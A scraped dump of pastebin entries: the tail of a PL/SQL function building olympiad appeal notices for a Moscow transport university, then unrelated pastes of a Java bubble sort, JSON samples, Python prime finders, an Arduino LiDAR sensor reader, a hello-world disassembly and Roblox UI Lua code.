|| '<li>по электронной почте <a href=""mailto:olymp@miit.ru"" target=""_blank"">olymp@miit.ru</a>;</li>'
|| '<li>по телефону (495) 684-24-10 (с 10:00 до 16:30) в будние дни;</li>'
|| '</ul>'
|| '<p>Апелляция по профилю «Математика» состоится 23 марта 2020 года в 15:00.</p>'
|| '<p>Апелляция по профилю «Техника и технологии» состоится 25 марта 2020 года в 13:00.</p>'
|| '<p>Апелляция пройдет в очной форме или в дистанционном режиме (конференц-связь) по выбору участников.</p>'
|| '<p>В очной форме апелляция пройдет в аудитории 3316 учебного корпуса №3 РУТ (МИИТ) по адресу ул. Новосущёвская, д. 22. стр. 2.</p>'
|| '<p>На апелляцию необходимо взять с собой паспорт.</p>'
*/

/*
q'[
'<p>Запись на апелляцию по профилю «Математика» будет происходить с 1 по 4 апреля 2021 года включительно.</p>
'<p>Запись на апелляцию по профилю «Техника и технологии» будет происходить с 2 по 6 апреля 2021 года включительно.</p>
'<p>Участникам необходимо сообщить свои ФИО, регистрационный номер работы:</p>
<ul>
<li>по электронной почте olymp@miit.ru;</li>
<li>по телефону (495) 684-24-10 (с 10:00 до 16:30) в будние дни;</li>
</ul>
'<p>Апелляция по профилю «Математика» состоится 5 апреля 2021 года в 16:00.</p>
'<p>Апелляция по профилю «Техника и технологии» состоится 7 апреля 2021 года в 15:00.</p>
'<p>Апелляция пройдет в дистанционном режиме.</p>
]'
*/
/*
q'[
<p>Запись на апелляцию будет проходить с 17 по 22 марта 2022 года включительно (необходимо сообщить свои ФИО, регистрационный номер работы):</p>
<ul>
<li>по электронной почте olymp@miit.ru;</li>
<li>по телефону +7 (495) 260-23-32 (с 09:30 до 16:30 в будние дни).</li>
</ul>
Даты проведения апелляций:</p>
<p>23 марта 2022 года в 13:00 – по профилю «Математика».</p>
<p>23 марта 2022 года в 15:00 – по профилю «Техника и технологии».</p>
<p>Место проведения апелляции: аудитория 3316 учебного корпуса №3 РУТ (МИИТ) по адресу: г.Москва, ул. Новосущёвская, д. 22. стр. 2.</p>
<p>Участникам олимпиады необходимо явиться на апелляцию лично.</p>
<p>На апелляции при себе необходимо иметь паспорт.</p>
]'
*/

q'[
<p>Запись на апелляцию будет проходить с 17 по 22 марта 2023 года включительно (необходимо сообщить свои ФИО, регистрационный номер работы):</p>
<ul>
<li>по электронной почте olymp@miit.ru;</li>
<li>по телефону +7 (495) 684-21-00 (с 10:00 до 17:30 в будние дни).</li>
</ul>
Даты проведения апелляций:</p>
<p>23 марта 2023 года в 11:00 – по профилю «Математика».</p>
<p>23 марта 2023 года в 11:00 – по профилю «Техника и технологии».</p>
<p>Место проведения апелляции по профилю «Математика»: г. Москва, ул. Образцова, д. 9 стр. 2, детский технопарк «Московский транспорт», аудитория «Водный транспорт».</p>
<p>Место проведения апелляции по профилю «Техника и технологии»: г. Москва, ул. Образцова, д. 9 стр. 2, детский технопарк «Московский транспорт», аудитория «Умные технологии».</p>
<p>Участникам олимпиады необходимо явиться на апелляцию лично.</p>
<p>На апелляции при себе необходимо иметь паспорт.</p>
]'


-- Венцель
when apk.idk_introductory_test = 76521 then
/*
'<p>Запись на апелляцию будет происходить с 6 по 10 апреля 2018 года включительно (необходимо сообщить свои ФИО, регистрационный номер работы):'
|| '<ul><li>по телефону (495) 684-24-10 (с 10:00 до 16:30 в будние дни);</li>'
|| '<li>по электронной почте olymp@miit.ru;</li></ul></p>'
|| '<p>Апелляция по предмету «Физика» состоится 11 апреля 2018 года в 12:00 в аудитории 3316 учебного корпуса №3 РУТ (МИИТ) по адресу ул. Новосущёвская, д. 22. стр. 2.</p>'
|| '<p>Апелляция по предмету «Математика» состоится 12 апреля 2018 года в 13:00 в аудитории 3316 учебного корпуса №3 РУТ (МИИТ) по адресу ул. Новосущёвская, д. 22. стр. 2.</p>'
|| '<p>На апелляцию необходимо взять с собой паспорт.</p>'
|| '<p>Участникам олимпиады необходимо явиться на апелляцию лично.</p>'
*/
--2019
/*
'<p>Запись на апелляцию будет происходить с 2 по 8 апреля 2019 года включительно (необходимо сообщить свои ФИО, регистрационный номер работы):'
|| '<ul><li>по телефону (495) 684-24-10 (с 10:00 до 16:30 в будние дни);</li>'
|| '<li>по электронной почте olymp@miit.ru;</li></ul></p>'
|| '<p>Апелляция состоится 09 апреля 2019 года в 12:00 в аудитории 3316 учебного корпуса №3 РУТ (МИИТ) по адресу ул. Новосущёвская, д. 22. стр. 2.</p>'
|| '<p>На апелляцию необходимо взять с собой паспорт.</p>'
|| '<p>Участникам олимпиады необходимо явиться на апелляцию лично.</p>'
*/
--2020
'<p>Запись на апелляцию будет происходить с 22 по 25 мая (до 18.00) года включительно (необходимо сообщить свои ФИО, регистрационный номер работы, выбранный вид апелляции):</p>'
|| '<ul><li>по электронной почте olymp@miit.ru;</li>'
|| '<li>по телефону +7 (901) 450-00-54 с 22 по 25 мая (до 18.00).</li></ul>'
|| '<p>Апелляция состоится 27 мая 2020 года в 14:00.</p>'
|| '<p>Апелляция пройдет в дистанционном режиме (конференц-связь) на платформе ZOOM (ссылку Вы получите после регистрации за 1 час до начала мероприятия).</p>'
|| '<p>По всем вопросам Вы можете обращаться в оргкомитет:</p>'
|| '<p>e-mail: olymp@miit.ru; pk@miit.ru</p>'
|| '<p>тел: +7 (901) 450-00-54</p>'
--|| '<p>Благодарим Вас за участие в олимпиаде, желаем творческих успехов в учебе и поступления в желаемый вуз!</p>'
else ''
end
  into res

  from introductory_estimations_ ie
       , sheet_action_pk_ spk
       , mwpr1.web_user wu
       , paragraphs_status_ ps
       , action_pk apk
  where wu.id_web_user = A_id_web_user
        and wu.id_e_kis = ie.id_e
        and ie.id_discipline = A_ID_Discipline
        and ie.id_sheet_action_pk = spk.id_sheet_action_pk
        and spk.id_action_pk = A_Id_Action_PK
        and apk.id_action_pk = spk.id_action_pk
        and ie.estimation_points is not null
        and spk.id_paragraph = ps.id_paragraph
        and ps.Status_order = 1;
  exception
    when others then
      res := null;
  end;
  return res;
end;
"
3PYL8JWN,bubble sort(),Aldin_SXR,Java,Monday 11th of March 2024 06:01:14 AM CDT,"public static void sort(int[] elements) {
    for (int i = 0; i < elements.length; i++)  {                // 1
        swapped = false; // reset swap                          // 2

        for (int j = 1; j < elements.length - i; j++) {         // 3
            if (elements[j - 1] > elements[j]) {                // 4
                swap(elements, j - 1, j);                    // 5
            }
        }

        /* If no two elements were swapped by inner loop, then break  */
        if (!swapped) {                                         // 6
            break;                                              // 6
        }
    }
}"
neK2gvBe,trip cancelation response,jgeorget,JSON,Monday 11th of March 2024 05:42:17 AM CDT,"{
    ""code"": ""cancelation"",
    ""message"": ""Cancelation confirmed, partner ref booking: trip1234"",
    ""status"": 200
}"
nLJrzBQq,trip cancelation,jgeorget,JSON,Monday 11th of March 2024 05:38:55 AM CDT,"{
    ""partner_booking_ref"": ""trip1234"",
    ""cancelled_at"":""2024-03-08""
}"
284vivdh,Review VT Markets,reviewbrokers,PHP,Monday 11th of March 2024 05:37:29 AM CDT,https://www.reviewbrokers.net/review-vt-markets/
zCm8PQ1Q,[site-reviews] include the IP Address in API requests,geminilabs,PHP,Monday 11th of March 2024 04:54:14 AM CDT,"add_filter('site-reviews/rest-api/reviews/schema/properties', function (array $properties) {
	if (isset($properties['ip_address']['context'])) {
		$properties['ip_address']['context'] = ['edit', 'view'];
	}
	return $properties;
});"
zRH1kCPT,Review VPFX,reviewbrokers,PHP,Monday 11th of March 2024 04:49:02 AM CDT,https://www.reviewbrokers.net/review-vpfx/
FN0Ty5P2,primes_finder_plus_optimized_v2.01,Python253,Python,Monday 11th of March 2024 04:40:12 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: primes_finder_plus_optimized.py
# Version: 2.01
# Author: Jeoi Reqi

import time

""""""
Primes Finder +Plus+:

This Python script identifies prime & palindromic prime numbers generated using the equation [P = y^2 - y + 41], where 'y' is a starting value provided by the user.
The script iterates through a sequence of numbers, checks if each corresponds to a prime and subsequently palindromic primes, and displays the results to the terminal.

**Requirements:**
- Python 3

**Usage:**
1. Run the script in a terminal or command prompt.
2. Enter the starting value for 'y'.
3. Specify the number of iterations to check.
4. The script will output primes & palindromic prime numbers along with their corresponding 'y' values.

**Note:**
- The equation used is [P = y^2 - y + 41].
- Prime numbers that are also palindromes will be highlighted in the output.

Example:
Enter the starting value for y: 41
Enter the number of iterations: 5000

Results:
[y=43, P=1847*]
[y=44, P=1933*]
[y=46, P=2111*]
[y=47, P=2203*]
[y=48, P=2297*]
[y=49, P=2393*]
...
[y=5034, P=25336163*]
[y=5038, P=25376447*]
[y=5040, P=25396601*]

Processing time: 0 hours, 0 minutes, 0.406290 seconds
""""""

def is_prime(num):
    """"""
    Checks if a given number is prime.

    Args:
        num (int): The number to check for primality.

    Returns:
        bool: True if the number is prime, False otherwise.
    """"""
    if num < 2:
        return False
    if num == 2 or num == 3:
        return True
    if num % 2 == 0 or num % 3 == 0:
        return False

    i = 5
    w = 2

    while i * i <= num:
        if num % i == 0:
            return False
        i += w
        w = 6 - w

    return True

def is_palindrome(num):
    """"""
    Checks if a given number is a palindrome.

    Args:
        num (int): The number to check for palindrome.

    Returns:
        bool: True if the number is a palindrome, False otherwise.
    """"""
    str_num = str(num)
    return str_num == str_num[::-1]

def generate_primes_and_palindromes(start_y, iterations):
    """"""
    Generates and identifies prime and palindromic prime numbers.

    Args:
        start_y (int): The starting value for 'y'.
        iterations (int): The number of iterations to check.

    Returns:
        list: A list of formatted strings representing the results.
    """"""
    results = []
    start_time = time.time()

    for y in range(start_y, start_y + iterations):
        P = y**2 - y + 41

        if is_prime(P) and is_palindrome(P):
            results.append(f""\033[31m[y={y}, pP={P}**]\033[0m"")
        elif is_prime(P):
            results.append(f""[y={y}, P={P}*]"")
        elif is_palindrome(P):
            results.append(f""\033[33m[y={y}, p={P}]\033[0m"")

    end_time = time.time()
    elapsed_time = end_time - start_time

    hours, remainder = divmod(elapsed_time, 3600)
    minutes, seconds = divmod(remainder, 60)

    results.append(f""\nProcessing time: {int(hours)} hours, {int(minutes)} minutes, {seconds:.6f} seconds"")

    return results

def main():
    """"""
    Main function to execute the script.
    Takes user input for 'y' and iterations, then outputs the results to the terminal.
    """"""
    start_y = int(input(""Enter the starting value for y: ""))
    iterations = int(input(""Enter the number of iterations: ""))
    data = generate_primes_and_palindromes(start_y, iterations)

    print(""\nResults:"")
    for result in data:
        print(result)

if __name__ == ""__main__"":
    main()

"
ZjKWuBPQ,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Monday 11th of March 2024 04:06:23 AM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Report explicit pastes
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
User profile page
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature

Simple Ads by Google Adsense ( Few rather than Pastebin )"
SswUSh0u,hello.asm,genericPaster,ASM (NASM),Monday 11th of March 2024 04:05:39 AM CDT,"Disassembly of section .init:

0000000000001000 <_init>:
    1000:       f3 0f 1e fa             endbr64
    1004:       48 83 ec 08             sub    $0x8,%rsp
    1008:       48 8b 05 e1 2f 00 00    mov    0x2fe1(%rip),%rax        # 3ff0 <__gmon_start__@Base>
    100f:       48 85 c0                test   %rax,%rax
    1012:       74 02                   je     1016 <_init+0x16>
    1014:       ff d0                   call   *%rax
    1016:       48 83 c4 08             add    $0x8,%rsp
    101a:       c3                      ret

Disassembly of section .plt:

0000000000001020 <.plt>:
    1020:       ff 35 8a 2f 00 00       push   0x2f8a(%rip)        # 3fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:       ff 25 8c 2f 00 00       jmp    *0x2f8c(%rip)        # 3fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
    102c:       0f 1f 40 00             nopl   0x0(%rax)
    1030:       f3 0f 1e fa             endbr64
    1034:       68 00 00 00 00          push   $0x0
    1039:       e9 e2 ff ff ff          jmp    1020 <_init+0x20>
    103e:       66 90                   xchg   %ax,%ax
    1040:       f3 0f 1e fa             endbr64
    1044:       68 01 00 00 00          push   $0x1
    1049:       e9 d2 ff ff ff          jmp    1020 <_init+0x20>
    104e:       66 90                   xchg   %ax,%ax

Disassembly of section .plt.got:

0000000000001050 <__cxa_finalize@plt>:
    1050:       f3 0f 1e fa             endbr64
    1054:       ff 25 76 2f 00 00       jmp    *0x2f76(%rip)        # 3fd0 <__cxa_finalize@GLIBC_2.2.5>
    105a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

Disassembly of section .plt.sec:

0000000000001060 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>:
    1060:       f3 0f 1e fa             endbr64
    1064:       ff 25 56 2f 00 00       jmp    *0x2f56(%rip)        # 3fc0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@GLIBCXX_3.4>
    106a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

0000000000001070 <_ZNSolsEPFRSoS_E@plt>:
    1070:       f3 0f 1e fa             endbr64
    1074:       ff 25 4e 2f 00 00       jmp    *0x2f4e(%rip)        # 3fc8 <_ZNSolsEPFRSoS_E@GLIBCXX_3.4>
    107a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

Disassembly of section .text:

0000000000001080 <_start>:
    1080:       f3 0f 1e fa             endbr64
    1084:       31 ed                   xor    %ebp,%ebp
    1086:       49 89 d1                mov    %rdx,%r9
    1089:       5e                      pop    %rsi
    108a:       48 89 e2                mov    %rsp,%rdx
    108d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
    1091:       50                      push   %rax
    1092:       54                      push   %rsp
    1093:       45 31 c0                xor    %r8d,%r8d
    1096:       31 c9                   xor    %ecx,%ecx
    1098:       48 8d 3d ca 00 00 00    lea    0xca(%rip),%rdi        # 1169 <main>
    109f:       ff 15 3b 2f 00 00       call   *0x2f3b(%rip)        # 3fe0 <__libc_start_main@GLIBC_2.34>
    10a5:       f4                      hlt
    10a6:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
    10ad:       00 00 00

00000000000010b0 <deregister_tm_clones>:
    10b0:       48 8d 3d 59 2f 00 00    lea    0x2f59(%rip),%rdi        # 4010 <__TMC_END__>
    10b7:       48 8d 05 52 2f 00 00    lea    0x2f52(%rip),%rax        # 4010 <__TMC_END__>
    10be:       48 39 f8                cmp    %rdi,%rax
    10c1:       74 15                   je     10d8 <deregister_tm_clones+0x28>
    10c3:       48 8b 05 1e 2f 00 00    mov    0x2f1e(%rip),%rax        # 3fe8 <_ITM_deregisterTMCloneTable@Base>
    10ca:       48 85 c0                test   %rax,%rax
    10cd:       74 09                   je     10d8 <deregister_tm_clones+0x28>
    10cf:       ff e0                   jmp    *%rax
    10d1:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
    10d8:       c3                      ret
    10d9:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

00000000000010e0 <register_tm_clones>:
    10e0:       48 8d 3d 29 2f 00 00    lea    0x2f29(%rip),%rdi        # 4010 <__TMC_END__>
    10e7:       48 8d 35 22 2f 00 00    lea    0x2f22(%rip),%rsi        # 4010 <__TMC_END__>
    10ee:       48 29 fe                sub    %rdi,%rsi
    10f1:       48 89 f0                mov    %rsi,%rax
    10f4:       48 c1 ee 3f             shr    $0x3f,%rsi
    10f8:       48 c1 f8 03             sar    $0x3,%rax
    10fc:       48 01 c6                add    %rax,%rsi
    10ff:       48 d1 fe                sar    %rsi
    1102:       74 14                   je     1118 <register_tm_clones+0x38>
    1104:       48 8b 05 ed 2e 00 00    mov    0x2eed(%rip),%rax        # 3ff8 <_ITM_registerTMCloneTable@Base>
    110b:       48 85 c0                test   %rax,%rax
    110e:       74 08                   je     1118 <register_tm_clones+0x38>
    1110:       ff e0                   jmp    *%rax
    1112:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)
    1118:       c3                      ret
    1119:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

0000000000001120 <__do_global_dtors_aux>:
    1120:       f3 0f 1e fa             endbr64
    1124:       80 3d 25 30 00 00 00    cmpb   $0x0,0x3025(%rip)        # 4150 <completed.0>
    112b:       75 2b                   jne    1158 <__do_global_dtors_aux+0x38>
    112d:       55                      push   %rbp
    112e:       48 83 3d 9a 2e 00 00    cmpq   $0x0,0x2e9a(%rip)        # 3fd0 <__cxa_finalize@GLIBC_2.2.5>
    1135:       00
    1136:       48 89 e5                mov    %rsp,%rbp
    1139:       74 0c                   je     1147 <__do_global_dtors_aux+0x27>
    113b:       48 8b 3d c6 2e 00 00    mov    0x2ec6(%rip),%rdi        # 4008 <__dso_handle>
    1142:       e8 09 ff ff ff          call   1050 <__cxa_finalize@plt>
    1147:       e8 64 ff ff ff          call   10b0 <deregister_tm_clones>
    114c:       c6 05 fd 2f 00 00 01    movb   $0x1,0x2ffd(%rip)        # 4150 <completed.0>
    1153:       5d                      pop    %rbp
    1154:       c3                      ret
    1155:       0f 1f 00                nopl   (%rax)
    1158:       c3                      ret
    1159:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

0000000000001160 <frame_dummy>:
    1160:       f3 0f 1e fa             endbr64
    1164:       e9 77 ff ff ff          jmp    10e0 <register_tm_clones>

0000000000001169 <main>:
    1169:       f3 0f 1e fa             endbr64
    116d:       55                      push   %rbp
    116e:       48 89 e5                mov    %rsp,%rbp
    1171:       48 8d 05 8d 0e 00 00    lea    0xe8d(%rip),%rax        # 2005 <_ZStL19piecewise_construct+0x1>
    1178:       48 89 c6                mov    %rax,%rsi
    117b:       48 8d 05 be 2e 00 00    lea    0x2ebe(%rip),%rax        # 4040 <_ZSt4cout@GLIBCXX_3.4>
    1182:       48 89 c7                mov    %rax,%rdi
    1185:       e8 d6 fe ff ff          call   1060 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
    118a:       48 8b 15 47 2e 00 00    mov    0x2e47(%rip),%rdx        # 3fd8 <_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GLIBCXX_3.4>
    1191:       48 89 d6                mov    %rdx,%rsi
    1194:       48 89 c7                mov    %rax,%rdi
    1197:       e8 d4 fe ff ff          call   1070 <_ZNSolsEPFRSoS_E@plt>
    119c:       b8 00 00 00 00          mov    $0x0,%eax
    11a1:       5d                      pop    %rbp
    11a2:       c3                      ret

Disassembly of section .fini:

00000000000011a4 <_fini>:
    11a4:       f3 0f 1e fa             endbr64
    11a8:       48 83 ec 08             sub    $0x8,%rsp
    11ac:       48 83 c4 08             add    $0x8,%rsp
    11b0:       c3                      ret"
HYPyB2k5,palindromic_primes_finder_optimized_v2.04,Python253,Python,Monday 11th of March 2024 03:27:28 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: palindromic_primes_finder_optimized_v2.04.py
# Version: 2.04
# Author: Jeoi Reqi

""""""
Palindromic Primes Finder:

This Python script focuses exclusively on identifying prime numbers that are palindromes, utilizing the equation [P = y^2 - y + 41], where 'y' is provided by the user.
The script iterates through a sequence of numbers, checking for palindromic primes, and displays the results.
Finally giving the user the processing time elapsed in the terminal. 

**Requirements:**
- Python 3

**Usage:**
1. Run the script in a terminal or command prompt.
2. Enter the starting value for 'y'.
3. Specify the number of iterations to check.
4. The script will output prime numbers that are also palindromes along with their corresponding 'y' values.
5. Outputs the elapsed time to process in the terminal.

**Note:**
- The equation used is [P = y^2 - y + 41].
- Only prime numbers that are palindromes will be displayed in the output.

Example:
Enter the starting value for y: 41
Enter the number of iterations: 10000000

Results:
[y=131, p=17071]
[y=1814, p=3288823]
[y=2738, p=7493947]
[y=17692, p=312989213]
[y=281233, p=79091719097]
[y=1372760, p=1884468644881]

Processing time: 164.902216 seconds
Processing time: 0 hours, 30 minutes, 18.918295 seconds
""""""

import random
import time

def is_prime(num, k=5):
    if num < 2:
        return False
    if num == 2 or num == 3:
        return True
    if num % 2 == 0 or num % 3 == 0:
        return False

    # Use a deterministic Miller-Rabin for smaller numbers
    if num < 1373653:
        return all(num % p != 0 for p in [2, 3, 5, 7, 11, 13, 17])

    s, d = 0, num - 1
    while d % 2 == 0:
        s += 1
        d //= 2

    for _ in range(k):
        a = random.randint(2, min(num - 2, 10**5))
        x = pow(a, d, num)
        if x == 1 or x == num - 1:
            continue

        for _ in range(s - 1):
            x = pow(x, 2, num)
            if x == num - 1:
                break
        else:
            return False

    return True

def is_palindrome(num):
    str_num = str(num)
    return str_num == str_num[::-1]

def generate_primes_and_palindromes(start_y, iterations):
    results = []
    start_time = time.time()

    for y in range(start_y, start_y + iterations):
        P = y**2 - y + 41

        if is_prime(P) and is_palindrome(P):
            results.append(f""[y={y}, p={P}]"")

    end_time = time.time()
    elapsed_time = end_time - start_time

    print(""\nResults:"")
    if not results:
        print(""No Palindromic Primes found."")
    else:
        for result in results:
            print(result)

    hours, remainder = divmod(elapsed_time, 3600)
    minutes, seconds = divmod(remainder, 60)
    print(f""\nProcessing time: {int(hours)} hours, {int(minutes)} minutes, {seconds:.6f} seconds\n"")


if __name__ == ""__main__"":
    start_y = int(input(""Enter the starting value for y: ""))
    iterations = int(input(""Enter the number of iterations: ""))
    generate_primes_and_palindromes(start_y, iterations)

"
qraqELx0,TFMini I2C,microrobotics,Arduino,Monday 11th of March 2024 02:59:34 AM CDT,"#include <Arduino.h>
#include <Wire.h>

const uint8_t SENSOR_ADDRESS = 0x10; // TFMini I2C Address
const uint8_t DISTANCE_DATA_LENGTH = 7; // Data length for distance data request
const uint8_t MAX_RETRY_COUNT = 3; // Maximum number of retries for reading data
const uint16_t UNRELIABLE_DATA = 0xFFFF; // Indicating unreliable data

struct SensorData {
  uint16_t distance;  // Measured distance
  uint16_t strength;  // Signal strength
  uint8_t rangeType;  // Range scale: 0 (short), 3 (intermediate), 7 (long)
  bool isValid;       // Flag to indicate if the data is valid
};

unsigned long readFrequencyMillis = 50; // Default read frequency: 50 ms

void setup() {
  Wire.begin();
  Serial.begin(115200);
  Serial.println(""TFMini I2C Test"");
}

void loop() {
  static unsigned long lastReadTime = 0; // Tracks the last read time
  unsigned long currentTime = millis(); // Current time

  if (currentTime - lastReadTime >= readFrequencyMillis) {
    SensorData data = tryReadSensorData(SENSOR_ADDRESS, MAX_RETRY_COUNT);

    if (data.isValid && data.distance != UNRELIABLE_DATA) {
      Serial.print(""\tDist["");
      Serial.print(data.distance);
      Serial.print(""]\tStrength["");
      Serial.print(data.strength);
      Serial.print(""]\tMode["");
      Serial.print(data.rangeType);
      Serial.println(""]"");
    }

    lastReadTime = currentTime; // Update the last read time
  }
}

void setReadFrequency(unsigned long frequencyMillis) {
  readFrequencyMillis = frequencyMillis;
}

SensorData tryReadSensorData(uint8_t deviceAddress, uint8_t retries) {
  while (retries--) {
    SensorData data = readSensorData(deviceAddress);
    if (data.isValid) {
      return data; // Valid data received
    }
    delay(10); // Wait a bit before retrying
  }
  return SensorData{0, 0, 0, false}; // Return invalid data after exhausting retries
}

SensorData readSensorData(uint8_t deviceAddress) {
  SensorData data = {0, 0, 0, false};

  Wire.beginTransmission(deviceAddress);
  Wire.write(0x01); // MSB
  Wire.write(0x02); // LSB
  Wire.write(DISTANCE_DATA_LENGTH); // Request distance data
  if (Wire.endTransmission(false) != 0) {
    return data; // Sensor did not acknowledge
  }

  Wire.requestFrom(deviceAddress, DISTANCE_DATA_LENGTH);
  if (Wire.available() < DISTANCE_DATA_LENGTH) {
    return data; // Not enough data available
  }

  for (uint8_t i = 0; i < DISTANCE_DATA_LENGTH; i++) {
    uint8_t incoming = Wire.read();
    switch (i) {
      case 0:
        data.isValid = (incoming == 0x01);
        break;
      case 2:
        data.distance = incoming; // LSB of the distance
        break;
      case 3:
        data.distance |= incoming << 8; // MSB of the distance
        if (data.distance == UNRELIABLE_DATA) {
          data.isValid = false;
        }
        break;
      case 4:
        data.strength = incoming; // LSB of signal strength
        break;
      case 5:
        data.strength |= incoming << 8; // MSB of signal strength
        break;
      case 6:
        data.rangeType = incoming; // Range scale
        break;
    }
  }
  return data;
}
"
BvmsrJHb,TheRealGalavant - CategorySwitch Custom System,FrenchFrazier,Lua,Monday 11th of March 2024 02:40:23 AM CDT,"This is the Category UI Switch for the game I am sending into Hidden Developers Application. I made a complex customization system where players click on Customization tab and can switch between the tabs and rotate the viewportframe 3d model, etc. Its still in the works, so this code doesn't really apply to anyone else using it as this is just part of the whole thing for an application. My name is TheRealGalavant, but my name is FrenchFrazier on here.


CatergorySwitch System:

-- Get references to UI elements
local CategoriesFrame = script.Parent
local CustomizationFrame = script.Parent.Parent

local CharacterFrame = CustomizationFrame:WaitForChild(""character"")
local ArmorFrame = CustomizationFrame:WaitForChild(""armor"")
local LoadoutFrame = CustomizationFrame:WaitForChild(""gunloadout"")

local CharacterButton = CategoriesFrame:WaitForChild(""char"")
local ArmorButton = CategoriesFrame:WaitForChild(""armor"")
local LoadoutButton = CategoriesFrame:WaitForChild(""loadout"")

-- Define the morph frames you want to control
local morphFrames = {
	[""501stSelectMorph""] = false,
	[""TGRSelectMorph""] = false,
	[""212thSelectMorph""] = false,
	[""187thSelectMorph""] = false,
	[""ARCSelectMorph""] = false,
	[""RCSelectMorph""] = false,
	[""CGSelectMorph""] = false,
	[""RGSelectMorph""] = false,
	[""TJOSelectMorph""] = false
}

-- Function to show a specific UI frame and hide others
local function ShowUIFrame(uiFrame)
	for _, frame in ipairs(CustomizationFrame:GetChildren()) do
		if frame:IsA(""Frame"") then
			frame.Visible = (frame == uiFrame)
		end
	end
end

-- Function to set text color and background transparency for category buttons
local function SetButtonStyle(clickedButton)
	for _, button in ipairs(CategoriesFrame:GetChildren()) do
		if button:IsA(""TextButton"") then
			button.TextColor3 = (button == clickedButton and Color3.new(0, 0, 0) or Color3.new(115/255, 135/255, 160/255))
			button.BackgroundTransparency = (button == clickedButton and 0 or 1)
		end
	end
end

-- Function to show or hide the ViewportFrame within Customized Morph ScreenGui
local function ToggleCustomizedMorphViewportFrameVisibility(visible)
	local customizedMorphScreenGui = CharacterFrame:FindFirstChild(""Customized Morph"")
	if customizedMorphScreenGui then
		local viewportFrame = customizedMorphScreenGui:FindFirstChild(""ViewportFrame"")
		if viewportFrame then
			viewportFrame.Visible = visible
		end
	end
end

-- Function to show 501stSelectMorph frame when 501stDiv button is clicked
local function Show501stSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""501stDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""501stSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show TGRSelectMorph frame when 501stDiv button is clicked
local function ShowTGRSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""GalacticRepublicDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""TGRSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show 212thSelectMorph frame when 501stDiv button is clicked
local function Show212thSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""212thDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""212thSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show 187thSelectMorph frame when 501stDiv button is clicked
local function Show187thSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""187thDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
